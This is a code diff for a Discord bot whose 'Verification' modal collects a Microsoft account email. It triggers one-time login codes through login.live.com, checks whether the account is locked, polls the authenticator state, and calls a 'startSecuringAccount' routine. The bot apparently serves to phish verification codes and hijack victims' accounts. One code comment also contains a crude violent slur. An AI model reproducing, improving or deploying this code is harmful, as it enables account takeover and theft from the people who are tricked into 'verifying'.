@@ -2,15 +2,17 @@ from discord import ui
 import datetime
 import requests
 import discord
+import asyncio
 import json
 import time
 import re
-import asyncio
 
 from views.buttons.button_two import ButtonViewTwo
 from views.buttons.button_three import ButtonViewThree
 
 from views.utils.startSecure import startSecuringAccount
+from views.utils.checkLocked import checkLocked
+from views.utils.sendAuth import sendAuth
 
 from views.modals.embeds import embeds
 
@@ -24,8 +26,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         # Check if email is valid
         if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(self.email.value) is None:
             await interaction.response.send_message(
-                "❌ Invalid Email. Make sure you entered your email correctly!",
-                ephemeral = True
+                "❌ Invalid Email. Make sure you entered your email correctly!", ephemeral = True
             )
             return
 
@@ -34,33 +35,18 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
+        # Checks if the account is locked
+        # Special thanks to Revive (kpriest95523) for this request
+        lockedInfo = checkLocked(self.email.value)
+
+        if "Value" not in lockedInfo or lockedInfo["Value"]["isAccountSuspended"]:
+            
+            interaction.response.send_message(
+                "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account."
+            )
+
         # Sends OTP/Auth code
-        # forceotclogin is what triggers the code, spamming otps may lead to <line 96> responses
-        emailInfo = requests.get(
-            url = "https://login.live.com/GetCredentialType.srf",
-            headers = {
-                "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691"
-            },
-            json = {
-                "checkPhones": True,
-                "country": "",
-                "federationFlags": 3,
-                "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
-                "forceotclogin": True,
-                "isCookieBannerShown": True,
-                "isExternalFederationDisallowed": True,
-                "isFederationDisabled": True,
-                "isFidoSupported": True,
-                "isOtherIdpSupported": True,
-                "isRemoteConnectSupported": True,
-                "isRemoteNGCSupported": True,
-                "isSignup": True,
-                "otclogindisallowed": True,
-                "username": self.email.value
-            }
-        ).json()
-        
-        print(emailInfo)
+        emailInfo = sendAuth(self.email.value)
 
         # Microsoft raping otp requests
         # Can be fixed since the latest otp sent still works
@@ -140,7 +126,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             await logs_channel.send(embed = sucessEmbed)
-            
+
             # Checks every second for the authenticator state
             def check_code(flowToken):
                 response = requests.post(
